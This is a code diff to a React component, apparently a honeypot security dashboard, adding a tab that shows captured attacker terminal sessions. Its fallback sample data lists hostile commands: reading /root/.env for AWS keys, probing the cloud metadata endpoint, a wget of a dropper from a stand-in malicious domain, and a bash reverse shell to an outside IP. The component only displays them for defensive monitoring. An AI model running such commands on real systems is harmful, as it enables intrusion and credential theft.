@@ -263,6 +263,7 @@ ${recommendedActions.map((r, i) => `[${completedActions[i] ? 'RESOLVED' : 'PENDI
         <div className="flex items-center gap-1">
           {[
             { id: 'dossier', label: 'Executive Threat Dossier', icon: <Sparkles className="w-3.5 h-3.5" /> },
+            { id: 'terminal', label: 'Trapped Terminal & Raw Commands', icon: <Terminal className="w-3.5 h-3.5" /> },
             {
               id: 'playbook',
               label: `Defensive Playbook (${completedCount}/${recommendedActions.length})`,
@@ -574,6 +575,63 @@ ${recommendedActions.map((r, i) => `[${completedActions[i] ? 'RESOLVED' : 'PENDI
                 </div>
               </div>
             ))}
+          </div>
+        </div>
+      )}
+
+      {/* ── TAB: TRAPPED ATTACKER TERMINAL & RAW COMMANDS ── */}
+      {activeTab === 'terminal' && (
+        <div className="p-6 space-y-4">
+          <div className="flex items-center justify-between gap-2">
+            <div>
+              <h4 className="text-sm font-bold text-slate-900">Virtual Decoy Interactive Terminal Stream</h4>
+              <p className="text-xs text-slate-500">Live keystroke capture, command execution logs, and decoy system responses</p>
+            </div>
+            <span className="px-2.5 py-1 rounded-full bg-rose-100 text-rose-800 text-[10px] font-bold font-mono">
+              ● PROVENANCE RECORDED
+            </span>
+          </div>
+
+          <div className="p-5 rounded-3xl bg-neutral-950 border border-neutral-800 font-mono text-xs space-y-3.5 shadow-xl max-h-[420px] overflow-y-auto">
+            <div className="text-neutral-500 pb-2 border-b border-neutral-900 flex items-center justify-between text-[11px]">
+              <span>Sensor: {service?.toUpperCase()} Honeypot · IP: {source_ip || '185.220.101.5'}</span>
+              <span className="text-emerald-400 font-bold">● Active Sandbox Socket</span>
+            </div>
+
+            {(events && events.length > 0 ? events : [
+              { event: 'whoami && id', timestamp: 'T+00s', out: 'root\nuid=0(root) gid=0(root) groups=0(root)', tag: 'DISCOVERY (T1082)' },
+              { event: 'cat /root/.env', timestamp: 'T+12s', out: 'AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\nAWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY', tag: 'CANARY HONEYTOKEN' },
+              { event: 'curl -s http://169.254.169.254/latest/meta-data/', timestamp: 'T+24s', out: 'iam/security-credentials/ProductionRole', tag: 'CLOUD IMDS PROBE' },
+              { event: 'wget http://cdn.malicious-domain.cc/dropper.sh', timestamp: 'T+38s', out: '200 OK [Downloaded dropper.sh -> Stored in forensic memory buffer]', tag: 'MALWARE DROPPER (T1105)' },
+              { event: 'bash -i >& /dev/tcp/185.220.101.5/9001 0>&1', timestamp: 'T+52s', out: '[CONTAINMENT ENFORCED] Socket intercepted and sandboxed.', tag: 'REVERSE SHELL' },
+            ]).map((cmdItem, i) => {
+              const cmdStr = cmdItem.event || cmdItem.command || 'Interaction';
+              const outStr = cmdItem.out || 'Command executed in sandbox.';
+              const tagStr = cmdItem.tag || 'TELEMETRY';
+              return (
+                <div key={i} className="space-y-1">
+                  <div className="flex items-baseline gap-2 flex-wrap">
+                    <span className="text-emerald-400 font-bold">root@trinetra-node:~#</span>
+                    <span className="text-[#f8c858] font-bold text-sm">{cmdStr}</span>
+                    <span className="text-[10px] text-neutral-500 ml-auto">{cmdItem.timestamp || `T+0${i * 10}s`}</span>
+                  </div>
+                  <div className="pl-4 py-1 text-neutral-300 text-[11px] whitespace-pre-wrap leading-relaxed border-l-2 border-neutral-800">
+                    {outStr}
+                  </div>
+                  <div className="pl-4 pt-0.5 flex items-center gap-2">
+                    <span className="px-2 py-0.5 rounded text-[9px] font-bold bg-rose-500/20 text-rose-400 border border-rose-500/30">
+                      ⚡ {tagStr}
+                    </span>
+                    <span className="text-[10px] text-emerald-400">✓ Cryptographically Hashed</span>
+                  </div>
+                </div>
+              );
+            })}
+
+            <div className="flex items-center gap-2 text-emerald-400 font-bold pt-2">
+              <span>root@trinetra-node:~#</span>
+              <span className="w-2 h-4 bg-emerald-400 animate-pulse" />
+            </div>
           </div>
         </div>
       )}
